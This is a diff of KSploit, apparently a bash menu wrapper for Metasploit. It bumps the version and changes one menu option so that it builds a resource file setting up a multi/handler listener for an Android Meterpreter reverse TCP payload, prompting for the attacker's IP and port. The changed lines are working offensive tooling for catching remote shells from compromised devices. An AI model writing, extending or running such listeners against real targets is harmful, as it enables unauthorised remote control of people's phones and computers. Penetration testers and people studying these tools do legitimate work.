@@ -1,5 +1,5 @@
 #!/bin/bash
-# Script: KSploit v 0.1
+# Script: KSploit v 1.0
 # Author: kaotickj
 # Website: kdgwebsolutions.com
 
@@ -609,7 +609,7 @@ listeners()
    echo "	  |---------------------------------------------|"
    echo "	  |    🍎${GREEN} 3 ${BLUE}OSX Reverse TCP listener.           ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    🐚${GREEN} 4 ${BLUE}Bash Reverse TCP listener.          ${YELLOW}|"
+   echo "	  |    🐚${GREEN} 4 ${BLUE}Android Reverse TCP listener.       ${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    🐱${GREEN} 5 ${BLUE}Netcat listener.                    ${YELLOW}|"
    echo "	  |---------------------------------------------|"
@@ -689,9 +689,9 @@ listeners()
         4)
             echo
             touch $wdir/meterpreter_droid.rc
-            echo "         ${FGC}     Crafting a Bash Reverse TCP Listener :     ${NC}${YELLOW}"
+            echo "         ${FGC}     Crafting a Android Reverse TCP Listener :     ${NC}${YELLOW}"
             echo use exploit/multi/handler > $wdir/meterpreter_droid.rc
-            echo set PAYLOAD osx/x86/shell_reverse_tcp >> $wdir/meterpreter_droid.rc
+            echo set PAYLOAD android/meterpreter/reverse_tcp >> $wdir/meterpreter_droid.rc
 	    read -p '	    Set Attacker IP* ' attackerip
             echo set LHOST $attackerip >> $wdir/meterpreter_droid.rc
             read -p '	    Set Attacker Port* ' attackerport
